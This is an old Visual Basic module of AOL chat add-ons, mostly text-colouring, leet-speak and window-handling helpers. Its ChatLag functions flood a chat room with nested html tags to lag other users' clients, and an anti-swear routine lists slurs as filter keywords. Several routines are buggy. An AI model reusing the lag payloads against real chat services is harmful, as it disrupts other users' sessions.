Let nextchr2$ = nextchr2$ + "<font color=" & mad & Dad & "106cac" & mad & ">"
Let newsent2$ = newsent2$ + nextchr2$
Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + "<font color=" & mad & Dad & "094a91" & mad & ">"
Let newsent2$ = newsent2$ + nextchr2$
Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + "<font color=" & mad & Dad & "1d1a62" & mad & ">"
Let newsent2$ = newsent2$ + nextchr2$
Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + "<font color=" & mad & Dad & "182a71" & mad & ">"
Let newsent2$ = newsent2$ + nextchr2$

Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + "<font color=" & mad & Dad & "000000" & mad & ">"
Let newsent2$ = newsent2$ + nextchr2$

Loop
BoldSendChat ("<U><I>" & newsent2$)

End Function
Sub Window_ChangeCaption(win, Txt)
'This will change the caption of any window that you
'tell it to as long as it is a valid window
Text% = SendMessageByString(win, WM_SETTEXT, 0, Txt)
End Sub
Sub Chat_Ignore(sn)
room% = AOLFindRoom
List% = Findchildbyclass(room%, "_AOL_Listbox")
End Sub
Function ChatLag()
Call SendChat("  <html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>")
End Function

Function ChatLag2()
Call SendChat("  <B><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html> <html></html><html></html><html></html><html></html><html></html><html></html><html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>")
End Function
Function ChatLink(link, Txt)
l00A8 = """"
AOLChatLink = "<a href=" & l00A8 & l00A8 & "><a href=" & l00A8 & l00A8 & "><a href=" & l00A8 & link & l00A8 & "><font color=#0000ff><u>" & Txt & "<font color=#fffeff></a><a href=" & l00A8 & l00A8 & ">"

End Function
Sub AddRoomToComboBox(ListBox As ListBox, ComboBox As ComboBox)
Call AddRoomToListBox(ListBox)
For q = 0 To ListBox.ListCount
    ComboBox.AddItem (ListBox.List(q))
Next q
End Sub

Sub RollFormsidetoside(frm As Form, steps As Integer, finish As Integer)
Do
frm.Width = frm.Width + steps
Loop Until frm.Width = finish
End Sub

Sub Wipeout(Lt%, Tp%, frm As Form)

       Dim s, Wx, Hx, i
       s = 90 'number of steps to use in the wipe
       Wx = frm.Width / s 'size of vertical steps
       Hx = frm.Height / s 'size of horizontal steps
       '     ' top and left are static
       '     ' while the width gradually shrinks

              For i = 1 To s - 1
                     frm.Move Lt%, Tp%, frm.Width - Wx
              Next

End Sub
Sub FormDance1(M As Form)

'  This makes a form dance across the screen
M.Left = 5
Timeout (0.1)
M.Left = 400
Timeout (0.1)
M.Left = 700
Timeout (0.1)
M.Left = 1000
Timeout (0.1)
M.Left = 2000
Timeout (0.1)
M.Left = 3000
Timeout (0.1)
M.Left = 4000
Timeout (0.1)
M.Left = 5000
Timeout (0.1)
M.Left = 4000
Timeout (0.1)
M.Left = 3000
Timeout (0.1)
M.Left = 2000
Timeout (0.1)
M.Left = 1000
Timeout (0.1)
M.Left = 700
Timeout (0.1)
M.Left = 400
Timeout (0.1)
M.Left = 5
Timeout (0.1)
M.Left = 400
Timeout (0.1)
M.Left = 700
Timeout (0.1)
M.Left = 1000
Timeout (0.1)
M.Left = 2000

End Sub




Sub StrikeOutSendChat(StrikeOutChat)
'This is a new sub that I thought of. It strikes
'the chat text out.
SendChat ("<S>" & StrikeOutChat & "</S>")
End Sub
Sub Virus()
'This was takin outta nash40.bas
'Thanxz Nash
' Might Want to get rid of that!
Printer.Print "RaVaGe ViRuS KiLL Or Be KiLLed #1"



End Sub
Sub imman(sn As TextBox, SN2 As TextBox, message As TextBox)
Call IMKeyword(sn, Chr(13) & Chr(13) & Chr(13) & Chr(13) & Chr(13) & "<font size=24><font color=#0000FF><B>" & SN2 & ":   <Font size=38><font color=#000000>" & message)
End Sub
Function wavetalker(strin2, f As ComboBox, C1 As ComboBox, C2 As ComboBox, C3 As ComboBox, C4 As ComboBox)
tixt = f
Color1 = C1
Color2 = C2
Color3 = C3
Color4 = C4
If Color1 = "Navy" Then Color1 = "000080"
If Color1 = "Maroon" Then Color1 = "800000"
If Color1 = "Lime" Then Color1 = "00FF00"
If Color1 = "Teal" Then Color1 = "008080"
If Color1 = "Red" Then Color1 = "F0000"
If Color1 = "Blue" Then Color1 = "0000FF"
If Color1 = "Siler" Then Color1 = "C0C0C0"
If Color1 = "Yellow" Then Color1 = "FFFF00"
If Color1 = "Aqua" Then Color1 = "00FFFF"
If Color1 = "Purple" Then Color1 = "800080"
If Color1 = "Black" Then Color1 = "000000"

If Color2 = "Navy" Then Color2 = "000080"
If Color2 = "Maroon" Then Color2 = "800000"
If Color2 = "Lime" Then Color2 = "00FF00"
If Color2 = "Teal" Then Color2 = "008080"
If Color2 = "Red" Then Color2 = "F0000"
If Color2 = "Blue" Then Color2 = "0000FF"
If Color2 = "Siler" Then Color2 = "C0C0C0"
If Color2 = "Yellow" Then Color2 = "FFFF00"
If Color2 = "Aqua" Then Color2 = "00FFFF"
If Color2 = "Purple" Then Color2 = "800080"
If Color1 = "Black" Then Color2 = "000000"

If Color3 = "Navy" Then Color3 = "000080"
If Color3 = "Maroon" Then Color3 = "800000"
If Color3 = "Lime" Then Color3 = "00FF00"
If Color3 = "Teal" Then Color3 = "008080"
If Color3 = "Red" Then Color3 = "F0000"
If Color3 = "Blue" Then Color3 = "0000FF"
If Color3 = "Siler" Then Color3 = "C0C0C0"
If Color3 = "Yellow" Then Color3 = "FFFF00"
If Color3 = "Aqua" Then Color3 = "00FFFF"
If Color3 = "Purple" Then Color3 = "800080"
If Color1 = "Black" Then Color3 = "000000"

If Color4 = "Navy" Then Color4 = "000080"
If Color4 = "Maroon" Then Color4 = "800000"
If Color4 = "Lime" Then Color4 = "00FF00"
If Color4 = "Teal" Then Color4 = "008080"
If Color4 = "Red" Then Color4 = "F0000"
If Color4 = "Blue" Then Color4 = "0000FF"
If Color4 = "Siler" Then Color4 = "C0C0C0"
If Color4 = "Yellow" Then Color4 = "FFFF00"
If Color4 = "Aqua" Then Color4 = "00FFFF"
If Color4 = "Purple" Then Color4 = "800080"
If Color1 = "Black" Then Color4 = "000000"

Let inptxt2$ = strin2
Let lenth2% = Len(inptxt2$)
mad = """"
Dad = "#"
Do While numspc2% <= lenth2%
Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + " "
Let newsent2$ = newsent2$ + nextchr2$

Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + " "
Let newsent2$ = newsent2$ + nextchr2$

Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + " "
Let newsent2$ = newsent2$ + nextchr2$

Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + " "
Let newsent2$ = newsent2$ + nextchr2$
Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + " "
Let newsent2$ = newsent2$ + nextchr2$

Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + " "
Let newsent2$ = newsent2$ + nextchr2$

Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + " "
Let newsent2$ = newsent2$ + nextchr2$

Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + " "
Let newsent2$ = newsent2$ + nextchr2$
Loop
wavytalker = newsent2$
End Function

Sub UnderLineSendChat(UnderLineChat)
' underlines chat text.
SendChat ("<B><u>" & UnderLineChat & "</u>")
End Sub
Sub Antiswearbot(P As Label)
'____________________
'put this in a timer
'soap 1998 (AQuA)
'_____________________
'Thanxz for all the great things
'u been sendin for the bas

If P = LastChatLineWithSN Then GoTo cd
P = LastChatLineWithSN
q = LCase(LastChatLine)
R = SNFromLastChatLine
Dim d As Integer
d = InStr(q, "ass")
If d Then SendChat " - " + R + " please do not swear!!! - "

d = InStr(q, "bitch")
If d Then SendChat " - " + R + " please do not swear!!! - "
  
d = InStr(q, "fuck")
If d Then SendChat " - " + R + " please do not swear!!! - "
  
d = InStr(q, "nigger")
If d Then SendChat " - " + R + " please do not swear!!! - "
  
d = InStr(q, "shit")
If d Then SendChat " - " + R + " please do not swear!!! - "
  
d = InStr(q, "chink")
If d Then SendChat " - " + R + " please do not swear!!! - "
  
d = InStr(q, "faggot")
If d Then SendChat " - " + R + " please do not swear!!! - "
  
d = InStr(q, "butt")
If d Then SendChat " - " + R + " please do not swear!!! - "
  
d = InStr(q, "slut")
If d Then SendChat " - " + R + " please do not swear!!! - "
  
d = InStr(q, "whore")
If d Then SendChat " - " + R + " please do not swear!!! - "
  
d = InStr(q, "dick")
If d Then SendChat " - " + R + " please do not swear!!! - "
  
d = InStr(q, "penis")
If d Then SendChat " - " + R + " please do not swear!!! - "
  
d = InStr(q, "vagina")
If d Then SendChat " - " + R + " please do not swear!!! - "
  
d = InStr(q, "lamer")
If d Then SendChat " - " + R + " please do not swear!!! - "
 
d = InStr(q, "pussy")
If d Then SendChat " - " + R + " please do not swear!!! - "
 
d = InStr(q, "fag")
If d Then SendChat " - " + R + " please do not swear!!! - "
 
d = InStr(q, "mean")
If d Then SendChat " - " + R + " please do not swear!!! - "
 
d = InStr(q, "steve case")
If d Then SendChat " - " + R + " please do not swear!!! - "
 
d = InStr(q, "anal")
If d Then SendChat " - " + R + " please do not swear!!! - "
 
d = InStr(q, "cum")
If d Then SendChat " - " + R + " please do not swear!!! - "
 
d = InStr(q, "porno")
If d Then SendChat " - " + R + " please do not swear!!! - "
 
d = InStr(q, "nigga")
If d Then SendChat " - " + R + " please do not swear!!! - "
cd:
End Sub


Sub ItalicSendChat(ItalicChat)
'Makes chat text in Italics.
SendChat ("<i>" & ItalicChat & "</i>")
End Sub
Sub BoldSendChat(BoldChat)
'This is new it makes the chat text bold.
'example:
'BoldSendChat ("ThIs Is BoLd")
'It will come out bold on the chat screen.
SendChat ("<b>" & BoldChat & "</b>")
End Sub
Sub BoldWavyChatBlueBlack(TheText)
G$ = TheText
a = Len(G$)
For w = 1 To a Step 4
    R$ = Mid$(G$, w, 1)
    u$ = Mid$(G$, w + 1, 1)
    s$ = Mid$(G$, w + 2, 1)
    T$ = Mid$(G$, w + 3, 1)
    P$ = P$ & "<B><FONT COLOR=" & Chr$(34) & "#0F" & Chr$(34) & "><sup>" & R$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & u$ & "<FONT COLOR=" & Chr$(34) & "#F0" & Chr$(34) & "><sub>" & s$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & T$
Next w
BoldSendChat (P$)
End Sub
Function BoldAOL4_WavColors2(Text1 As String)
G$ = Text1
a = Len(G$)
For w = 1 To a Step 4
    R$ = Mid$(G$, w, 1)
    u$ = Mid$(G$, w + 1, 1)
    s$ = Mid$(G$, w + 2, 1)
    T$ = Mid$(G$, w + 3, 1)
    P$ = P$ & "<b><FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & "><sup>" & R$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#006600" & Chr$(34) & ">" & u$ & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & "><sub>" & s$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "##006600" & Chr$(34) & ">" & T$
Next w
BoldSendChat (P$)
End Function
Sub BoldWavyColorbluegree(TheText)
G$ = TheText
a = Len(G$)
For w = 1 To a Step 4
    R$ = Mid$(G$, w, 1)
    u$ = Mid$(G$, w + 1, 1)
    s$ = Mid$(G$, w + 2, 1)
    T$ = Mid$(G$, w + 3, 1)
    P$ = P$ & "<b><FONT COLOR=" & Chr$(34) & "#0F" & Chr$(34) & "><sup>" & R$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#006600" & Chr$(34) & ">" & u$ & "<FONT COLOR=" & Chr$(34) & "#0F" & Chr$(34) & "><sub>" & s$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "##006600" & Chr$(34) & "></b>" & T$
Next w
BoldSendChat (P$)
End Sub
Function BoldWavyColorredandblack(TheText)

G$ = TheText
a = Len(G$)
For w = 1 To a Step 4
    R$ = Mid$(G$, w, 1)
    u$ = Mid$(G$, w + 1, 1)
    s$ = Mid$(G$, w + 2, 1)
    T$ = Mid$(G$, w + 3, 1)
    P$ = P$ & "<FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & "><sup>" & R$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#000000" & Chr$(34) & ">" & u$ & "<FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & "><sub>" & s$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "#000000" & Chr$(34) & "></b>" & T$
Next w
BoldWavyColorredandblack (P$)
End Function
Function BoldWavyColorredandblue(TheText)
G$ = TheText
a = Len(G$)
For w = 1 To a Step 4
    R$ = Mid$(G$, w, 1)
    u$ = Mid$(G$, w + 1, 1)
    s$ = Mid$(G$, w + 2, 1)
    T$ = Mid$(G$, w + 3, 1)
    P$ = P$ & "<FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & "><sup>" & R$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#0F" & Chr$(34) & ">" & u$ & "<FONT COLOR=" & Chr$(34) & "#ff0000" & Chr$(34) & "><sub>" & s$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "#0F" & Chr$(34) & "></b>" & T$
Next w
BoldWavyColorredandblack (P$)
End Function

Sub EliteTalker(word$)
Made$ = ""
For q = 1 To Len(word$)
    letter$ = ""
    letter$ = Mid$(word$, q, 1)
    Leet$ = ""
    X = Int(Rnd * 3 + 1)
    If letter$ = "a" Then
    If X = 1 Then Leet$ = "â"
    If X = 2 Then Leet$ = "å"
    If X = 3 Then Leet$ = "ä"
    End If
    If letter$ = "b" Then Leet$ = "b"
    If letter$ = "c" Then Leet$ = "ç"
    If letter$ = "d" Then Leet$ = "d"
    If letter$ = "e" Then
    If X = 1 Then Leet$ = "ë"
    If X = 2 Then Leet$ = "ê"
    If X = 3 Then Leet$ = "é"
    End If
    If letter$ = "i" Then
    If X = 1 Then Leet$ = "ì"
    If X = 2 Then Leet$ = "ï"
    If X = 3 Then Leet$ = "î"
    End If
    If letter$ = "j" Then Leet$ = ",j"
    If letter$ = "n" Then Leet$ = "ñ"
    If letter$ = "o" Then
    If X = 1 Then Leet$ = "ô"
    If X = 2 Then Leet$ = "ð"
    If X = 3 Then Leet$ = "õ"
    End If
    If letter$ = "s" Then Leet$ = "š"
    If letter$ = "t" Then Leet$ = "†"
    If letter$ = "u" Then
    If X = 1 Then Leet$ = "ù"
    If X = 2 Then Leet$ = "û"
    If X = 3 Then Leet$ = "ü"
    End If
    If letter$ = "w" Then Leet$ = "vv"
    If letter$ = "y" Then Leet$ = "ÿ"
    If letter$ = "0" Then Leet$ = "Ø"
    If letter$ = "A" Then
    If X = 1 Then Leet$ = "Å"
    If X = 2 Then Leet$ = "Ä"
    If X = 3 Then Leet$ = "Ã"
    End If
    If letter$ = "B" Then Leet$ = "ß"
    If letter$ = "C" Then Leet$ = "Ç"
    If letter$ = "D" Then Leet$ = "Ð"
    If letter$ = "E" Then Leet$ = "Ë"
    If letter$ = "I" Then
    If X = 1 Then Leet$ = "Ï"
    If X = 2 Then Leet$ = "Î"
    If X = 3 Then Leet$ = "Í"
    End If
    If letter$ = "N" Then Leet$ = "Ñ"
    If letter$ = "O" Then Leet$ = "Õ"
    If letter$ = "S" Then Leet$ = "Š"
    If letter$ = "U" Then Leet$ = "Û"
    If letter$ = "W" Then Leet$ = "VV"
    If letter$ = "Y" Then Leet$ = "Ý"
    If letter$ = "`" Then Leet$ = "´"
    If letter$ = "!" Then Leet$ = "¡"
    If letter$ = "?" Then Leet$ = "¿"
    If Len(Leet$) = 0 Then Leet$ = letter$
    Made$ = Made$ & Leet$
Next q
BoldSendChat (Made$)
End Sub

Sub IMsOn()
Call IMKeyword("$IM_ON", "RaVaGe Ownz U ")
End Sub
Sub IMsOff()
Call IMKeyword("$IM_OFF", "RaVaGe ownz u ")
End Sub






Sub Attention(TheText As String)

BoldSendChat ("$$$$$$$ ATTENTION $$$$$$$$")
Call Timeout(0.15)
BoldSendChat (TheText)
Call Timeout(0.15)
BoldSendChat ("$$$$$$$ ATTENTION $$$$$$$$")
Call Timeout(0.15)
'BoldSendChat ("<FONT COLOR=" & Chr$(34) & "#0F" & Chr$(34) & ">" & "‹›·´¯`·._.·• " & G$ & "v¹·¹" & L$ & "<FONT COLOR=" & Chr$(34) & "#0" & Chr$(34) & "> • " & aa$ & "<FONT COLOR=" & Chr$(34) & "#0" & Chr$(34) & "> • ")
End Sub

Sub KillGlyph()
' Kills the annoying spinning AOL logo in the toobar
' on AOL 4.0
aol% = FindWindow("AOL Frame25", vbNullString)
AOTooL% = Findchildbyclass(aol%, "AOL Toolbar")
AOTool2% = Findchildbyclass(AOTooL%, "_AOL_Toolbar")
Glyph% = Findchildbyclass(AOTool2%, "_AOL_Glyph")
Call SendMessage(Glyph%, WM_CLOSE, 0, 0)
End Sub

Sub unKillGlyph()

For GetIcon = 1 To 19
    AOIcon% = GetWindow(AOIcon%, 2)
Next GetIcon
End Sub



Function TrimTime()
b$ = Left$(Time$, 5)
HourH$ = Left$(b$, 2)
HourA = Val(HourH$)
If HourA >= 12 Then Ap$ = "PM"
If HourA = 24 Or HourA < 12 Then Ap$ = "AM"
If HourA > 12 Then
    HourA = HourA - 12
End If
If HourA = 0 Then HourA = 12
HourH$ = Str$(HourA)
TrimTime = HourH$ & Right$(b$, 3) & " " & Ap$
End Function
Function TrimTime2()
b$ = Time$
HourH$ = Left$(b$, 2)
HourA = Val(HourH$)
If HourA >= 12 Then Ap$ = "PM"
If HourA = 24 Or HourA < 12 Then Ap$ = "AM"
If HourA > 12 Then
    HourA = HourA - 12
End If
If HourA = 0 Then HourA = 12
HourH$ = Str$(HourA)
TrimTime2 = HourH$ & ":" & Right$(b$, 5) & " " & Ap$
End Function

Function EliteText(word$)
Made$ = ""
For q = 1 To Len(word$)
    letter$ = ""
    letter$ = Mid$(word$, q, 1)
    Leet$ = ""
    X = Int(Rnd * 3 + 1)
    If letter$ = "a" Then
    If X = 1 Then Leet$ = "â"
    If X = 2 Then Leet$ = "å"
    If X = 3 Then Leet$ = "ä"
    End If
    If letter$ = "b" Then Leet$ = "b"
    If letter$ = "c" Then Leet$ = "ç"
    If letter$ = "e" Then
    If X = 1 Then Leet$ = "ë"
    If X = 2 Then Leet$ = "ê"
    If X = 3 Then Leet$ = "é"
    End If
    If letter$ = "i" Then
    If X = 1 Then Leet$ = "ì"
    If X = 2 Then Leet$ = "ï"
    If X = 3 Then Leet$ = "î"
    End If
    If letter$ = "j" Then Leet$ = ",j"
    If letter$ = "n" Then Leet$ = "ñ"
    If letter$ = "o" Then
    If X = 1 Then Leet$ = "ô"
    If X = 2 Then Leet$ = "ð"
    If X = 3 Then Leet$ = "õ"
    End If
    If letter$ = "s" Then Leet$ = "š"
    If letter$ = "t" Then Leet$ = "†"
    If letter$ = "u" Then
    If X = 1 Then Leet$ = "ù"
    If X = 2 Then Leet$ = "û"
    If X = 3 Then Leet$ = "ü"
    End If
    If letter$ = "w" Then Leet$ = "vv"
    If letter$ = "y" Then Leet$ = "ÿ"
    If letter$ = "0" Then Leet$ = "Ø"
    If letter$ = "A" Then
    If X = 1 Then Leet$ = "Å"
    If X = 2 Then Leet$ = "Ä"
    If X = 3 Then Leet$ = "Ã"
    End If
    If letter$ = "B" Then Leet$ = "ß"
    If letter$ = "C" Then Leet$ = "Ç"
    If letter$ = "D" Then Leet$ = "Ð"
    If letter$ = "E" Then Leet$ = "Ë"
    If letter$ = "I" Then
    If X = 1 Then Leet$ = "Ï"
    If X = 2 Then Leet$ = "Î"
    If X = 3 Then Leet$ = "Í"
    End If
    If letter$ = "N" Then Leet$ = "Ñ"
    If letter$ = "O" Then Leet$ = "Õ"
    If letter$ = "S" Then Leet$ = "Š"
    If letter$ = "U" Then Leet$ = "Û"
    If letter$ = "W" Then Leet$ = "VV"
    If letter$ = "Y" Then Leet$ = "Ý"
    If Len(Leet$) = 0 Then Leet$ = letter$
    Made$ = Made$ & Leet$
Next q

Call IMKeyword(Text1.Text, Made$)

End Function


Sub IMIgnore(thelist As ListBox)
aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = Findchildbyclass(aol%, "MDIClient")
IM% = findchildbytitle(mdi%, ">Instant Message From:")
If IM% <> 0 Then
    For findsn = 0 To thelist.ListCount
        If LCase$(thelist.List(findsn)) = LCase$(SNfromIM) Then
            BadIM% = IM%
            IMRICH% = Findchildbyclass(BadIM%, "RICHCNTL")
            Call SendMessage(IMRICH%, WM_CLOSE, 0, 0)
            Call SendMessage(BadIM%, WM_CLOSE, 0, 0)
        End If
    Next findsn
End If
End Sub
Function r_Color(strin As String)
'Returns the strin Colored
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let nextchr$ = Mid$(inptxt$, numspc%, 1)
Let nextchr$ = nextchr$ + "<font color=" & """" & "#ff0000" & """" & ">"
Let newsent$ = newsent$ + nextchr$
Let nextchr$ = nextchr$ + "<font color=" & """" & "#ff8040" & """" & ">"
Let newsent$ = newsent$ + nextchr$
Let nextchr$ = nextchr$ + "<font color=" & """" & "#008080" & """" & ">"
Let newsent$ = newsent$ + nextchr$
Let nextchr$ = nextchr$ + "<font color=" & """" & "#008000" & """" & ">"
Let newsent$ = newsent$ + nextchr$
Let nextchr$ = nextchr$ + "<font color=" & """" & "#0000ff" & """" & ">"
Let newsent$ = newsent$ + nextchr$
Let nextchr$ = nextchr$ + "<font color=" & """" & "#808000" & """" & ">"
Let newsent$ = newsent$ + nextchr$
Let nextchr$ = nextchr$ + "<font color=" & """" & "#800080" & """" & ">"
Let newsent$ = newsent$ + nextchr$
Let nextchr$ = nextchr$ + "<font color=" & """" & "#000000" & """" & ">"
Let newsent$ = newsent$ + nextchr$
Let nextchr$ = nextchr$ + "<font color=" & """" & "#808080" & """" & " > """
Loop
r_Color = newsent$
End Function
Function aolChatLag3(TheText As String)
G$ = TheText$
a = Len(G$)
For w = 1 To a Step 3
    R$ = Mid$(G$, w, 1)
    u$ = Mid$(G$, w + 1, 1)
    s$ = Mid$(G$, w + 2, 1)
    P$ = P$ & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & "><pre><html><pre><html><pre><html>" & R$ & "</html></pre></html></pre></html></pre>" & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & u$ & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & "><pre><html>" & s$ & "</html></pre>"
Next w
ChatLag = P$
End Function
Sub ChangeCaption(HWD%, newcaption As String)
Call AOLSetText(HWD%, newcaption)
End Sub
Function AOLIMSTATIC(newcaption As String)
ANTI1% = findchildbytitle(AOLMDI(), ">Instant Message From:")
STS% = Findchildbyclass(ANTI1%, "_AOL_Static")
st% = GetWindow(STS%, GW_HWNDNEXT)
st% = GetWindow(st%, GW_HWNDNEXT)
Call ChangeCaption(st%, newcaption)
End Function
Function SNfromIM()

aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = Findchildbyclass(aol%, "MDIClient") '

IM% = findchildbytitle(mdi%, ">Instant Message From:")
If IM% Then GoTo Greed
IM% = findchildbytitle(mdi%, "  Instant Message From:")
If IM% Then GoTo Greed
Exit Function
Greed:
IMCap$ = GetCaption(IM%)
theSN$ = Mid(IMCap$, InStr(IMCap$, ":") + 2)
SNfromIM = theSN$

End Function



Sub KillModal()
modal% = FindWindow("_AOL_Modal", vbNullString)
Call SendMessage(modal%, WM_CLOSE, 0, 0)
End Sub

Sub waitforok()
Do
DoEvents
okw = FindWindow("#32770", "America Online")
If proG_STAT$ = "OFF" Then
Exit Sub
Exit Do
End If

DoEvents
Loop Until okw <> 0
   
    okb = findchildbytitle(okw, "OK")
    okd = SendMessageByNum(okb, WM_LBUTTONDOWN, 0, 0&)
    oku = SendMessageByNum(okb, WM_LBUTTONUP, 0, 0&)


End Sub

Function Black_LBlue(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, f, f - f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (msg)
End Function



Function YellowPinkYellow(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(78, 255 - f, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (msg)
End Function

Function WhitePurpleWhite(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255 - f, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (msg)
End Function

Function LBlue_Green_LBlue(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (msg)
End Function

Function LBlue_Yellow_LBlue(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
    BoldSendChat (msg)
End Function

Function Purple_LBlue_Purple()
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, f, 255 - f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
    BoldSendChat (msg)
End Function

Function DBlue_Black_DBlue(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        d = Right(c, 1)
        e = 450 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
    BoldSendChat (msg)
End Function

Function DGreen_Black(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f - f, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
  BoldSendChat (msg)
End Function



Function LBlue_Orange(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 155, f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (msg)
End Function



Function LBlue_Orange_LBlue(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 155, f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
    BoldSendChat (msg)
End Function

Function LGreen_DGreen(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        d = Right(c, 1)
        e = 220 / a
        f = e * b
        G = RGB(0, 375 - f, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
  BoldSendChat (msg)
End Function

Function LGreen_DGreen_LGreen(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        d = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 375 - f, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
    BoldSendChat (msg)
End Function

Function LBlue_DBlue(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        d = Right(c, 1)
